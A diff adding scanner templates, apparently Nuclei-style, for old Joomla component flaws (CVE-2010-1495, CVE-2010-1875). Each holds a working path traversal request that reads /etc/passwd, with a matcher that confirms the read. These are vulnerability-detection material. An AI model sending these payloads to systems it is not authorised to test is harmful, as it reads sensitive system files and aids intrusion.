@@ -796,6 +796,40 @@
       ]
     },
     {
+      "id": "CVE-2010-1495",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Matamko (com_matamko) component 1.01 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Matamko 1.01 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12286\n- https://www.cvedetails.com/cve/CVE-2010-1495\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_matamko&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1602",
       "info": {
         "author": "daffainfo",
@@ -859,6 +893,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_market&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1875",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Real Estate Property (com_properties) component 3.1.22-03 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Property - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/11851\n- https://www.cvedetails.com/cve/CVE-2010-1875\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_properties&controller=../../../../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
